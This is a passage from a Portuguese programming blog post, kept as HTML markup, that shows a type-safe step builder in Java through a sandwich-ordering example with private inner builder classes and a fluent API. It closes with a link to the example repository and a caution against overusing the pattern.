        &lt;span class="nc"&gt;LanchePassoFinal&lt;/span&gt; &lt;span class="nf"&gt;comMolho&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Molho&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="nc"&gt;Lanche&lt;/span&gt; &lt;span class="nf"&gt;build&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Nossas implementações dessa interfaces podem ser classes internas e privadas.&lt;/p&gt;

&lt;p&gt;Bom, seguindo essas alterações, nosso código ficou:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight java"&gt;&lt;code&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Lanche&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;Vegetal&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Molho&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nf"&gt;Lanche&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;LanchePassoFinalBuilder&lt;/span&gt; &lt;span class="n"&gt;lanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tamanho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;queijo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;vegetais&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;molho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;lanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="nc"&gt;CriacaoLanchePassos&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;LancheBuilder&lt;/span&gt; &lt;span class="nf"&gt;umLanche&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;LancheBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;LancheBuilder&lt;/span&gt; &lt;span class="kd"&gt;implements&lt;/span&gt; &lt;span class="nc"&gt;CriacaoLanchePassos&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;LancheBuilder&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nf"&gt;LancheBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;CriacaoLanchePassos&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;LancheTerceiroPasso&lt;/span&gt; &lt;span class="nf"&gt;grande&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;LancheTerceiroPassoBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                    &lt;span class="nc"&gt;Tamanho&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;GRANDE&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;CriacaoLanchePassos&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;LancheTerceiroPasso&lt;/span&gt; &lt;span class="nf"&gt;normal&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;LancheTerceiroPassoBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                    &lt;span class="nc"&gt;Tamanho&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;NORMAL&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;LancheTerceiroPassoBuilder&lt;/span&gt; &lt;span class="kd"&gt;implements&lt;/span&gt; &lt;span class="nc"&gt;CriacaoLanchePassos&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;LancheTerceiroPasso&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nf"&gt;LancheTerceiroPassoBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                                          &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                                          &lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tamanho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;CriacaoLanchePassos&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;LancheQuartoPasso&lt;/span&gt; &lt;span class="nf"&gt;comQueijo&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;LancheQuartoPassoBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                    &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;


    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;LancheQuartoPassoBuilder&lt;/span&gt; &lt;span class="kd"&gt;implements&lt;/span&gt; &lt;span class="nc"&gt;CriacaoLanchePassos&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;LancheQuartoPasso&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nf"&gt;LancheQuartoPassoBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                                        &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                                        &lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tamanho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;queijo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;CriacaoLanchePassos&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;LanchePassoFinal&lt;/span&gt; &lt;span class="nf"&gt;comVegetais&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Vegetal&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;LanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                    &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                    &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nc"&gt;List&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;of&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;));&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;

    &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;LanchePassoFinalBuilder&lt;/span&gt; &lt;span class="kd"&gt;implements&lt;/span&gt; &lt;span class="nc"&gt;CriacaoLanchePassos&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;LanchePassoFinal&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;final&lt;/span&gt; &lt;span class="nc"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;Vegetal&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nc"&gt;Molho&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;

        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="nf"&gt;LanchePassoFinalBuilder&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Tamanho&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                                       &lt;span class="nc"&gt;Recheio&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nc"&gt;Pao&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                                       &lt;span class="nc"&gt;Queijo&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
                                       &lt;span class="nc"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nc"&gt;Vegetal&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;tamanho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tamanho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;recheio&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;recheio&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;pao&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pao&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;queijo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;queijo&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;vegetais&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;vegetais&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;LanchePassoFinalBuilder&lt;/span&gt; &lt;span class="nf"&gt;comMolho&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nc"&gt;Molho&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;molho&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;molho&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="nc"&gt;Lanche&lt;/span&gt; &lt;span class="nf"&gt;build&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nf"&gt;Lanche&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Com isso, não temos mais acesso a detalhes internos de implementação:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qWMiEToy--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/v8ikl4ru2pwdjx2t57qh.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qWMiEToy--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/v8ikl4ru2pwdjx2t57qh.png" alt="Digitando . e aparecendo apenas o método umLanche"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Conseguimos seguir estritamente a ideia de ocultação de informação (&lt;em&gt;information hiding&lt;/em&gt;) ou encapsulamento. Não temos nenhuma indireção, temos apenas uma API fluente. Códigos assim são comumente encontrados em bibliotecas com um bom design de código.&lt;/p&gt;

&lt;p&gt;Você pode encontrar o código desse post neste repositório: &lt;a href="https://github.com/gabrielronei/typesafebuilder-subway-exemplo"&gt;github.com/gabrielronei/typesafebuilder-subway-exemplo&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;O repositório está divido em três branches, que são os três principais pontos que chegamos até aqui: &lt;code&gt;primeira_refatoracao&lt;/code&gt;, &lt;code&gt;segunda_refatoracao&lt;/code&gt; e &lt;code&gt;terceira_refatoracao&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Existem várias soluções possiveis para esse código, porém essa foi uma solução que achei legal e quis mostrar para vocês. &lt;/p&gt;

&lt;p&gt;Espero que a ideia tenha ficado clara e que vocês consigam aproveitar algo desse tipo no dia-a-dia.&lt;/p&gt;

&lt;p&gt;Lembrem-se, como tudo em Arquitetura/Design de Software, não é uma bala de prata. Sendo utilizada em excesso pode causar problemas e dificuldade de entendimento.&lt;/p&gt;

&lt;p&gt;Mas é algo muito interessante que podemos ter como uma carta em nossa manga! :)&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#refer%C3%AAncias"&gt;
  &lt;/a&gt;
  Referências:
&lt;/h2&gt;

&lt;ul&gt;
